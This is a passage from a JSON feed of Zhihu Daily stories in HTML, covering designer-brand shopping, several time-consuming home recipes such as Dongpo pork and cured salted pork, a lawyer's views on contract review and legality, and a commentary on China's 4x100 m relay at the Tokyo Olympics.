是叛逆前卫的哥特风，走这种路线的人会非常喜欢这个品牌的理念和设计。</strong></p>\n<p>除了审美共鸣，中高端的设计师品牌也会利用<strong>限量、稀缺</strong>来影响消费者心理，让人更迫切地想得到它，得到的时候会觉得很珍贵，很受鼓舞。</p>\n<p>之前就有读者留言说：“发了年终奖，奖励了自己一个包包，鼓励自己以后更积极地对待工作和生活。”</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-2a5e7617b696b4055e0a46eb8e5a0652_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这种正面的消费心理是不是还挺不错的？所以<strong>贵价消费也有积极的一面，</strong>心态可以更包容些。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-6df6cfe289602e284ff2bbfeca56e0e7_720w.gif?source=8673f162\" alt=\"\"></figure><ul><li><strong>实际需求</strong></li></ul>\n<p>另一方面就是<strong>实际需求</strong>了，我作为时尚博主深有体会。</p>\n<p>因为经常要产出穿搭，我每个月都会买很多衣服。但之前新疆棉的事情曝光后，我就不买很多快时尚品牌了，都穿奢侈品又太不实际。</p>\n<p>所以我就把目光转到一些设计师品牌上，陆陆续续入手了一些，不过确实比较费钱：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-b03fbff7a68bab718bd5c760edf7f397_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-d08ed65e094e68aa723ee4df96bdcc16_720w.jpg?source=8673f162\" alt=\"\"></figure><p>但毕竟我是工作有需要，大家日常里最好<strong>根据实际风格和穿搭预算来考量，</strong>没必要攀比或者跟风。</p>\n<p><strong>包包类可以选设计师款，</strong>大部分的设计师品牌还是爱惜羽毛的，不容易有山寨尴尬的问题，价格也比奢侈品友好一些。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-2602fcb90608ffd6184327d2b674a794_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>穿搭的话</strong>可以根据自己的风格，或者临时的诉求来决定要不要买。去一些重要的场合或者旅游度假，就可以入手几件设计师品牌的衣服。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-1f27aab5d3cee00eaad09e3eb7a95da3_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-cf1e1d56f55ad211542958ffaa78df0a_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲ 上面是之前为读者选的 Alice + Olivia 吊带裙，适合娘 man 风的女生；下面是我之前去小森林旅游，选了 MinjuKim 的绿色短裤，拍照蛮出片的。</strong></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/23052376\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738995"},{"title":"你做出过什么特别费时，但却十分好吃的美食？","date":"2021-08-08 23:06:39","description":"<div>\n<div>\n<div>\n<img src=\"https://pica.zhimg.com/v2-871b6970c21cf256eb1b49f170aba3f7_l.jpg?source=8673f162\"><span>囡囡</span>\n<a href=\"https://www.zhihu.com/question/421807647/answer/1481002248\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>柴火煨的东坡肉</strong></p>\n<p>每次都是从早上忙到下午两三点才能吃上，吃这个得下决心，毕竟过程太折腾了，但出锅时那个香气浓郁色泽鲜丽又让人完全觉得这点儿忙碌不是个事儿。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-fa0e33ccd8a92c6e598c46f8654a04ec_720w.jpg?source=8673f162\" alt=\"\"></figure><p>早上去菜场，挑肥瘦相间的五花肉，不去皮，切方块。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-a95a0b3d3e49017fe5288ad6cbd782fc_720w.jpg?source=8673f162\" alt=\"\"></figure><p>棉绳子系好。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-2906962550aca6b5cf186a28522bf8b6_720w.jpg?source=8673f162\" alt=\"\"></figure><p>焯水，水里料酒、姜、花椒、八角都可以放一点，去腥气、去血水。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-ea78de1874e84f93980936b69c8b771e_720w.jpg?source=8673f162\" alt=\"\"></figure><p>焯水的同时准备等会儿煨肉用的焦糖水。（因为我是柴火做的，所以焯水的过程中有充分的时间给我准备锅底。如果是煤气天然气电磁炉，可以根据不同情况安排时间，最好能够保证肉在第一次加热后全程不要变凉。）</p>\n<p>冰糖一大块儿，和一小碗底水煮开。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-3e8cd2d4f3519de0f3ac1bc3de712d6c_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-a0b9f9ebb2f70565224f64f01abf0e9f_720w.jpg?source=8673f162\" alt=\"\"></figure><p>煮至非常浓稠且泛焦糖色时，再倒入一小碗烫开水调出深棕色泛红的糖水。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-fd6b12ef3e6168de8ae7842b136f1f5d_720w.jpg?source=8673f162\" alt=\"\"></figure><p>熬糖时有两点需要注意：1、糖浆要不停搅拌，不然后期容易局部受热糊底导致整锅糖浆带苦味儿。2、如果糖浆已经很稠，不管什么原因想要加水都一定要加烫开水，不然糖浆会迅速凝固。</p>\n<p>做好焦糖水，肉差不多也焯好了，捞起来盛盘用热开水冲洗去浮沫。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-fcf4f09bb56859c03ef5f56fc636f301_720w.jpg?source=8673f162\" alt=\"\"></figure><p>看网友评论，感觉之前这一部分写得不够详细，补充一下：猪皮上的毛也是要去干净的，我一般是焯水后去，个人感觉相比焯水前，焯水后会更好去，这个问题上我不是很专业，如果有懂的朋友，欢迎细说或指正。</p>\n<p>还有一个细节前面忘记说了，讲究的话可以照做：买回来的五花肉如果是没有去皮的，切块焯水前可以用刀侧过来多刮几次猪皮表面，可以去掉猪皮表层不干净的腻子。一般要用到带皮五花肉做的菜，买回来我会先这样处理一下。</p>\n<p>下图是清理过后的肉块，清理过程忘记拍了，不好意思。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-cc1e09f13c7d1293a48ec75e711bae90_720w.jpg?source=8673f162\" alt=\"\"></figure><p>处理干净的肉小火慢炸把油烤出来，时不时要给肉翻面，烤到泛金黄。这步用柴火尤其耗时，很考验我耐心。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-2291bb566599f5d003fa1d7f08496f92_720w.jpg?source=8673f162\" alt=\"\"></figure><p>把葱、姜、红枣、山楂片切好铺进一只砂锅里，葱可以多铺一点，有助于避免肉在煮的过程中粘锅底。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-430fb2b0270d0aa6f66b43e8a432c435_720w.jpg?source=8673f162\" alt=\"\"></figure><p>炸好的肉放入砂锅中，有皮的那面朝上，倒入之前准备好的焦糖水、酱油、黄酒或者料酒。不同的酒形成的口感不同，可以根据个人口味灵活选择。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-4174fb41f34eae7b5320e8f1f89796b6_720w.jpg?source=8673f162\" alt=\"\"></figure><p>大火烧开锅后，小火慢炖，炖到汁收到一半的时候把肉翻面，有皮的那面朝下，直到把汁收到快干，出锅。一般得炖一个半小时快两个小时。期间一定要注意防止肉黏锅。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-4e110ab6a85228b150cbdbfe85c24619_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-4ffa732fe67df43d512cb715fef11e25_720w.jpg?source=8673f162\" alt=\"\"></figure><p>装盘，到这一步已经很有看相了，不过这还没完呢，还得再腾盘蒸上一个多小时，免得这肉太油腻且泛干。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-12642be0f7bdb62fd69d22baf422e645_720w.jpg?source=8673f162\" alt=\"\"></figure><p>蒸完的东坡肉趁热撒上一把小葱花，可以说是完美诠释了“肥而不腻”这四个字，酸甜鲜香，不枉这一番折腾。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-c97a72ff2f2b3caef8c86b37c412d8ff_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>腌笃鲜</strong></p>\n<p>每年到了有竹笋的季节，家乡这里爱吃竹笋烧咸肉，当地叫腌笃鲜，两样开春才凑齐的食材结合在一起，鲜上加鲜，不用加任何调味剂就能鲜掉眉毛。</p>\n<p>其中一位主角——咸肉，往往是家家户户自己动手腌制。整个腌制过程有半月有余，到咸肉彻底风干则更久。做法费时但并不复杂，上手容易，做好后易于储存，用来煲汤煮皆饭咸鲜可口，比鲜肉有过之无不及，我想这也是它贯穿古今，成为很多老南京及其他地区同志们年年要做的美食原因之一。</p>\n<p>这是我今年腌的咸肉。</p>\n<p><strong>要用到的食材：10 斤五花肉、1 斤粗盐、花椒、八角、白酒、一个容器和一堆重物。</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-cef8713413d679255369c9441f4dca8c_720w.jpg?source=8673f162\" alt=\"\"></figure><p>腌咸肉本身不难，重要的是开始腌制的时间，一般是寒冬腊月的时候腌，这样腌制过程中才不容易坏，最晚到初春我也腌过，总之气温不能太高，空气也不能太湿。</p>\n<p>买肥瘦相间的五花肉，开成不宽不窄的长条，期间不要用水洗，怎么清理我后面会说。</p>\n<p>半斤左右粗盐加上花椒和一点点八角小火翻炒到盐微微泛黄，我个人的诀窍是加一点十三香粉炒，感觉这样做出来更香，量凭个人口味自己把握。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-c4a63f8e352b8ba4c63170c2d8a35c95_720w.jpg?source=8673f162\" alt=\"\"></figure><p>生五花肉用干净纱布蘸白酒反复擦拭表面清洗，白酒消毒且能去腥，不能用水。</p>\n<p>擦好的肉表面均匀地抹上炒好的盐，整齐摆放到容器里。怕坏可以多放点盐。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-f81a806d131e595fd7c59eedfef2020a_720w.jpg?source=8673f162\" alt=\"\"></figure><p>抹好放整齐的肉，用保鲜膜盖好，上面压上重物，我当时压了一袋十斤的大米，一桶大桶的食用油，然后能累住的都往上累了一点儿，总之是重点儿好，重点儿能在腌制过程中把肉的水分压出来。</p>\n<p>压上一两天，容器里就会有约莫小半容器汁水，把水倒干，把肉翻一翻，再炒半斤粗盐，抹在肉上，压上重物，腌一两天。</p>\n<p>一两天后肉里的水分大部分都腌出来了，就能系上绳子挂在阴凉通风处风干了。大概要挂十几天的样子。</p>\n<p>风干后的咸肉可以就挂在那儿，想吃的时候切点儿，也可以用真空机抽真空保存，我一般会在初夏时开始抽真空。这样的咸肉，不冷冻也能存一年多还保持口感如初。</p>\n<p>咸肉几乎是百毒不侵，到入夏前后，会招来一种蛾子之类昆虫的幼虫，一种黑颜色的毛毛虫，听说以前没有冰箱没有真空机的时候，是靠麻油来驱逐这种虫子。也是很有意思。</p>\n<p>屋后竹林里采的嫩笋，焯水去涩味儿。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-e28430142c9b98de4a2497a964c2f26b_720w.jpg?source=8673f162\" alt=\"\"></figure><p>咸肉开片煎出香气，加热开水炖至汤发白，春笋下进咸肉汤里煮至竹笋的清香鲜甜味儿融入汤里。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-4f80b750706354e624e653c93251ac89_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这两样食材在一起合出来的味儿绝不负多月苦等，浑然天成，是盘里的江南春光，可人又明媚。：D</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-3fed8a2645200966e47fa10d1620fdde_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>芝士猪肉脯</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-8e162a99a4b70f4d860d5d076b001f0f_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-757b97338583d19db2ed0b7956bda3dd_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>中秋节月饼</strong></p>\n<p>月饼做完需要回油三天，光冲这点就让我这个算数困难户觉得很费时费事，再加上每年中秋前夕本身就挺忙的，还得算各种材料准备的时间，算烤好月饼后的回油时间，算清楚了得提前准备材料进行制作，不然就赶上不送给自己想送的人……等等等等。</p>\n<p>可是却从来没有觉得不值，因为每个拿到我亲手做的月饼的人都会很开心；人活着不是只为了自己，更多时候，喜悦的心情，是给别人带来幸福感的同时，从大家的共情中产生的。</p>\n<p>我想这也是很多食物，乃至事物，明明很耗时耗力，很艰难险阻，但我们仍然奋勇前行，契而不舍的原因。</p>\n<p>网上有很多怎么做月饼的相关教程，我这里就不写做法了，因为我感觉我的月饼味道真的挺一般的，还经常塌掉……</p>\n<p>自己这门“小手艺”实在算不上好，也因此更感谢每年亲人朋友们收到它后表现出来的认同与喜爱，食物带来的从来不是单纯的物质享受。</p>\n<p>五仁月饼说：生而为仁，五要努力不感到抱歉～ 谢谢同志们的喜欢，祝大家中秋快乐！双节快乐！</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-aedb01b89134cc8c060debb223fb267a_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-9d9bdbc5ee0b19150afbe5ff7d1a0df3_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>油鸡枞</strong></p>\n<p>这个没有太大的技术含量，主要就是费时间，感觉倒是挺切题的。从采回来清洗好直到下锅，半天的时间就耗在里面了，熬制则不管是柴火还是天然气，都是三四个小时起步，好吃，但是略辛苦。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-dab5945d3f0c121f99d4d5bd0bc7c29d_720w.jpg?source=8673f162\" alt=\"\"></figure><p>做法以前写过的，这里不再复述啦。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-e61dbc140a912fd1147ce2417cdb9ca3_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-48e52781f4dce95145d76ac1247d661d_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-c39ac051ea7e5968bc26eb9174d35ea0_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-f42a4b578c52e4a99d1ace0e946dbcc4_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-8a3e1a0b85cd991236c9f189495b7b9f_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-47b7a530bc3f0623d68d0ddf53ccb011_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>上汤竹燕窝</strong></p>\n<p>这道菜费时之处在于很多前期准备工作，一来是汤底的熬制，二来是竹燕窝的清洗。一般一锅好的汤底，从处理食材到熬制，时间不会少于四个小时。刚采回来的竹燕窝也需要经过来来回回的仔细清洗，才能将上面的竹沫等杂物彻底清理干净。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-f748a0194c7e427485e83942ead39379_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-d7d20bbb648f6450a70044d85a48bddc_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-235444777559a9f3a3fa360091f36ad0_720w.jpg?source=8673f162\" alt=\"\"></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/421807647\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738987"},{"title":"律师审合同的专业性体现在哪里？","date":"2021-08-08 23:06:29","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-d1f485885e3f4839967be5a9af2944f7_l.jpg?source=8673f162\"><span>Icaman lawyer，</span><span>法天使fatianshi.cn创始人。关注合同。</span>\n<a href=\"https://www.zhihu.com/question/63418624/answer/1458384600\" hidden>阅读原文</a>\n</div>\n<div>\n<p>专业性体现在：</p>\n<p>1）促进交易，而不是凸显存在感。</p>\n<p>不是改很多，让客户觉得律师工作有价值，律师卖了力气了。而是这样做是否有助于促进交易，或者说有助于帮助客户创造价值。当然不是说律师不能指出合同无效甚至建议停止交易。</p>\n<p>但促进交易，是律师合同工作的第一原则。在此之下，三观四步法还会提到，合同违法不等于无效，无效不等于无用，无用不等于不能签。比如，建设工程合同，在违法转包情形下可能认定无效，但工程结束已经验收的，法院仍然判决参照合同结算工程款。</p>\n<p>根本上，还是要本着促进交易的原则看合同。这个意义上，一些无关紧要的错别字，如果反复修改导致双方流程繁琐而阻碍交易，则可以选择不要修改。</p>\n<p>2）最小手术原则。</p>\n<p>好的医生，手术后给病人带来最小的创伤，不留疤最好。改个合同，修改得面目全非，看起来律师很尽责、很专业，但增加了交易成本，让对方法律人员高度审慎地详细修改我方修改过的合同，也是不妥当的做法。</p>\n<p>相反，抓住实质，在促成交易前提下，做看起来不明显的关键修改，反而更好。这是促进交易原则的应有之义。</p>\n<p>根据评论增加一个内容——</p>\n<p>3）律师审查过的合同需要“确保合法”吗？</p>\n<p>感谢陈戈先生在本回答留言评论：</p>\n<blockquote>我以为：律师审合同的专业性，一定要体现在：一是合法性。法律是律师的专业，首先要确保你所代表一方的行为合法。</blockquote>\n<p>这是个需要进一步澄清的问题。</p>\n<p>律师应该非常关注交易的合法性，但通常并不能“确保”合法，也不能把合法当做合同工作的终点。</p>\n<p>这可能挑战很多人的思维，但请大家进一步思考一下——</p>\n<p>在现实的商业世界中，有很多很多交易都是违法的，而所谓的违法，则可能是法律、行政法规，也可能是地方法规、部门规章，可能违反管理性强制规范，也可能影响效力性强制规范。</p>\n<p>我们都知道影响合同效力的，必须是法律、行政法规，且还要区分效力性强制规范和管理性强制规范。实际上，有大量的强制性规范，都是管理性强制规范。交易违反这些规范，则可能产生行政处罚等外部后果，而合同的效力并不受影响，当事人也能因此实现交易目的。</p>\n<p>这是第一层意思：违法，不一定无效。</p>\n<p>更进一层：无效，不一定无用。</p>\n<p>比如，违章建筑的房屋，租赁合同无效。此种情形下，律师审查租赁合同，如何确保合法？确保合法的唯一办法，是不要签署这个合同。</p>\n<p>但是，还要进一步注意：《城镇房屋租赁合同司法解释》第 4 条：出租人就未经批准或者未按照批准内容建设的临时建筑，与承租人订立的租赁<strong>合同无效</strong>。……第 5 条：房屋租赁合同无效，<strong>当事人请求参照合同约定的租金标准支付房屋占有使用费的，人民法院一般应予支持。</strong></p>\n<p>再举一例：《民法典》第 793 条：建设工程施工合同无效，<strong>但是建设工程经验收合格的，可以参照合同关于工程价款的约定折价补偿承包人</strong>。</p>\n<p>在前述两个例子中，合同因违法行为而产生了很严重的“无效”的后果，但是无效的后果之下，合同当事人还是实现了自己的交易目的。</p>\n<p>可见，违法不一定无效，无效不一定无用。</p>\n<p>律师的恰当做法，是指出违法性，给出无效的后果的评估。在此基础上请当事人确认是否签署，如果签署的，在此基础上进一步审查合同。若可能，还应该思考是否能调整交易结构。</p>\n<p>比如，把时间拉回到 2015 年左右滴滴刚刚推出在线打车，假如你是滴滴的律师，客户请你起草滴滴软件的用户协议，你一查法律法规，出租车业务需要相关资质，而滴滴在全国范围内搞出租车业务，没资质，违法！那你怎么办？不能确保合法，于是建议客户：这事违法，不能干，合同写不了。可当时滴滴的律师或法务怎么做的呢？经营同样业务的美国打车公司 Uber 来到中国，面对同样的法律环境，又是怎么干的呢？来看当年两家公司的条款（注意，是当年的版本）</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-b73ce23207227c0548ca4a3c78cf561b_720w.jpg?source=8673f162\" alt=\"\"></figure><p>看明白其中的要点了吧，既然干出租违法，那就强调，干的不是出租业务，而是信息平台，这么一来就“合法”了吗？要看你怎么理解了。而这正是他们的律师或法务的价值所在。看看当年的 VIE 架构的发明，也有类似的启发。</p>\n<p>合同违法、无效所产生的后果，可以从“外部”（监管机构、第三方）和“内部”（当事人之间）这两个维度去考察。下图来自图书《合同起草审查指南：三观四步法（民法典更新版）》，我们可以得出如下图形——</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-9a31e1a8efe4d5d0e302b61e2f38b390_720w.jpg?source=8673f162\" alt=\"\"></figure><p>当一个合同或条款存在违法、无效风险时，我们都可以判断它是属于上图中哪个位置，从而对其风险有大致把握。</p>\n<p>存在“违法、无效”可能性的合同的起草审查，特别考验律师的功力。（某种意义上，也是律师价值所在。）</p>\n<p>律师一方面要注意：违法≠无效，无效≠无用；另一方面，既然有违法无效之处，就要考虑风险和应对。</p>\n<p>其难点在于，违法无效的可能性蕴藏在合同的各个方面（主体、标的、程序与模式），来源于各种法律规范。如何才能有步骤地全面排查，以避免遗漏？实务中，缺乏体系化梳理。此处放一张实训营课程中梳理的图表，供大家参考，这部分内容展开说要几万字，为防止跑题，这里不赘述，具体可阅读《合同起草审查指南：三观四步法（民法典更新版）》。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-f0fb2567013dd9aa74f1ecb7b581ced4_720w.jpg?source=8673f162\" alt=\"\"></figure><p>注：图表来自合同实训营三观四步法交易结构审查部分课件，版权属于法天使。</p>\n<p>小结：</p>\n<p>一句泛泛的律师要确保合同的“合法性”，是比较粗浅的看法。律师应站在促进交易的原则之下，从不同层面把握交易，处理合同。律师是在法律视角下，给当事人提供决策依据，而当事人的决策是法律、商业、行业、战略、产品、运营的多维度决策，法律只是其决策依据之一。</p>\n<p>为防止误解，还要进一步说明一下：律师必须注重执业安全。如果律师发现合同背后的交易违法、无效、甚至犯罪，律师应当建议停止交易，甚至停止法律服务。若律师没能发现这些风险，只在微观层面“审查”合同，则属于严重失职。而这也是三观四步法主张“合同审查的重点是动脑而非动笔”，主张必须“先对交易结构进行审查”的原因。</p>\n<hr>\n<p>说句题外话，律师合同起草审查，其实是件“价值感”很低的工作。</p>\n<p>合同质量差，当事人诚信履行，可能没争议；合同质量高，当事人履行不能，可能还是要诉讼（当然好的合同在诉讼中更有利）。</p>\n<p>并且，合同的好坏，往往要交易完成之后才有反馈。这导致，律师的合同工作的反馈是严重滞后且变形的。也导致律师和客户，法务和业务之间存在种种冲突。业务希望法务最好别“太啰嗦”成交最重要，客户希望律师最好“整简单点”，“反馈要快”。</p>\n<p>最后，合同的起草审查服务，作为一项专业服务缺乏标准。而标准何其重要？工业品规模化大生产的前提，是有标准。有了标准，复杂的事情，可以有品质控制。没标准，就只能看经验和职业操守，就不可控。</p>\n<p>因此，合同起草审查的三观四步法，本质上是想提供一套标准的知识和方法，让这件事有品质控制，有效率。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/63418624\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9739013"},{"title":"2020 东京奥运田径男子 4 x 100 米接力决赛中国队夺得第 4，如何评价本场比赛？","date":"2021-08-06 14:33:35","description":"\n<p>汤星强起跑足够出色、谢震业顺利过渡、苏炳添疯狂的追赶、吴智强全程力压牙买加守住优势——37秒79，追平国家纪录（2019年多哈世锦赛，苏炳添/许周政/吴智强/谢震业）！</p>\n<p>与上一届里约奥运会一样，还是决赛第四——甚至跑赢了牙买加！</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-c5750d9ab6f2272b179d722d21640b83_720w.jpg?rss\" data-caption=\"最后一棒的交接，有点可惜了，本来可以更好的。吴的启动节奏啊……\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-c5750d9ab6f2272b179d722d21640b83\" data-watermark-src=\"v2-08d0a57bd0340d6037f1d3ef29548f4a\" data-private-watermark-src=\"v2-fddd1be1a64a00a596372a2249cb2419\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-cc12df8436067a80b7aa7c4bfaa1497b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1730\" data-rawheight=\"662\" data-watermark=\"watermark\" data-original-src=\"v2-cc12df8436067a80b7aa7c4bfaa1497b\" data-watermark-src=\"v2-027efbc8a13cc7bb9489ed8507691e6d\" data-private-watermark-src=\"v2-bf556e669c6d50037239aab16e008b6e\"></p>\n<p><br></p>\n<p>意大利田径队是今夏东京田径赛场上最大的黑马，中国田径队是中国代表队里最让人欣喜的队伍——哪怕他/她们的目标都只是进入决赛、争取名次。</p>\n<p>这些无奖牌的王者，真的是中国体育的骄傲。</p>\n<p><br></p>\n<hr>\n<p>4x100米可以说的点太多了，往详细了说——</p>\n<p><br></p>\n<p>「奥运会是国与国之间无硝烟的战争」这句话让顾拜旦（现代奥运会主要倡导者）听到，估计会气的七窍生烟。但说4x100米接力项目，是国与国之间最强速度的PK，这个描述问题就不大——100米/200米项目都是个体天才间的pk，4x100米这样的接力，就完美体现了最强的速度、最高的默契、最完美的/零容忍的技术要求。</p>\n<p>可能是整届奥运会最紧张刺激的项目（之一）。</p>\n<p><br></p>\n<p><b>25岁的汤星强、27岁的谢震业、32岁的苏炳添、27岁的吴智强，他们代表的中国速度，真的完全不亚于中国其他领域的速度。</b></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-1d7c0c20cf2a6f9527ec4580153ae127_720w.jpg?rss\" data-caption=\"预赛小组第一\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-1d7c0c20cf2a6f9527ec4580153ae127\" data-watermark-src=\"v2-e0e1adfea571518903404993c7867568\" data-private-watermark-src=\"v2-9e01dfefb3e5355ab1ac4a6116c6fa05\"></p>\n<h2>\n<br>预赛回顾：超神的小组第一，力压美加意等短跑强国</h2>\n<p><br></p>\n<p>预赛两组。</p>\n<p>第一组牙买加、英国、日本、特立尼达和多巴哥、法国、南非都算是有进入决赛实力的。最终牙买加（37秒82）、英国（38秒02）、日本（38秒16）晋级；</p>\n<p>我们在第二组，<b>汤星强、谢震业、苏炳添、吴智强跑出37秒92，力压加拿大、意大利等强队，第二组排名第一晋级决赛。</b></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-9a492c2ad3130c85c9c41014d99bef4f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-9a492c2ad3130c85c9c41014d99bef4f\" data-watermark-src=\"v2-8c663fbabc3df4c1e2df077364365a2c\" data-private-watermark-src=\"v2-5816b498fe42b8087d1814e926432d43\"></p>\n<p><br></p>\n<p>预赛中国队发挥并不算完美，交接棒的一些衔接细节可以做得更好些。</p>\n<p><b>但37秒92本赛季最佳、小组第一晋级的结果，完全不需要吹毛求疵了——汤星强的起跑足够给力、谢震业守住了领先优势、第三棒苏炳添的表现天神下凡生生创造出距离差、而最后一棒吴智强也完全没让加拿大的迫近变成逆转。</b></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-dc1c5483289690ec3852afd8b96a2634_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"460\" data-watermark=\"watermark\" data-original-src=\"v2-dc1c5483289690ec3852afd8b96a2634\" data-watermark-src=\"v2-c74d92a122e191c35f696a0b59d26e4b\" data-private-watermark-src=\"v2-696695d33ae6f77dce93d3fd78229b62\"></p>\n<p><br></p>\n<p>美国出人意料的小组第六（38秒10）、以0.02秒的微弱劣势没能晋级决赛——赛后网上那个小视频估计大家都看到了。<b>苏神问谢震业美国队情况，小谢抿着水摇着手指、一脸坏笑说，“（美国队）没进（决赛），小组第六！”</b></p>\n<p>淘气。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-9107901260c9fc86bbca5af8051820d8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2858\" data-rawheight=\"1558\" data-watermark=\"watermark\" data-original-src=\"v2-9107901260c9fc86bbca5af8051820d8\" data-watermark-src=\"v2-93d72687e8eddada5575da9c8fd1894b\" data-private-watermark-src=\"v2-d204d799e6a8348a1fddd0d3cdebc4d8\"></p>\n<p><br></p>\n<p>特别提一下美国队。</p>\n<p>美国的短跑和4x100接力队，自古以来（从1912年奥运设项来）都是全世界第一档的水准——<b>奥运会4x100一共25次（男子）比赛，美国拿了15次冠军、2次亚军。</b></p>\n<p>一度是碾压式的短跑接力梦之队。</p>\n<p>但牙买加崛起后，美国在短跑上就陷入特别尴尬的境地，屡战屡败。上一次拿到金牌已经是悉尼奥运会、过去20多年了。</p>\n<p>2019年多哈世锦赛美国队非常强势夺冠，当时老美全国都有一种被牙买加压迫了那么多年、翻身农奴把歌唱的喜悦。结果东京奥运会科尔曼禁赛、贾斯汀老去，今年短跑美国又表现的很萎靡。</p>\n<p>接力尤其拉胯。</p>\n<p><br></p>\n<p><b>不夸张的说，中国这几年不见得4x100就完全不敢/不该和美国比，相反我们有些年轻人冒起来——这篇内容最后会提到——我们是完全可以掰一掰手腕的。</b></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-e0153436b3795cfbf0389763434d0540_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-e0153436b3795cfbf0389763434d0540\" data-watermark-src=\"v2-3a14f9697e583b4154e5ecfb73997e16\" data-private-watermark-src=\"v2-3ecb1c7ff446b38b44c440e5d9607a7e\"></p>\n<p><br></p>\n<p>就事论事，再多说一下预赛的分组。</p>\n<p>之前接力分组出来后，有声音说日本把自己分在弱组，把中国放进死亡组。这种争议有点没有必要。</p>\n<p>一来日本自身不弱，二来接力谈不上多少能放水的（除非最后一棒大幅领先），和强队一组反而能跑得更快，且日本那组真的不弱。就算拿不到前三也能靠更快成绩进决赛。</p>\n<p><br></p>\n<p>这样进入决赛的八支接力队，按半决赛成绩依次是，牙买加、中国、加拿大、意大利、英国、德国、加纳、日本。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-2e702ed1f0628514393a7200b2a488cf_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" 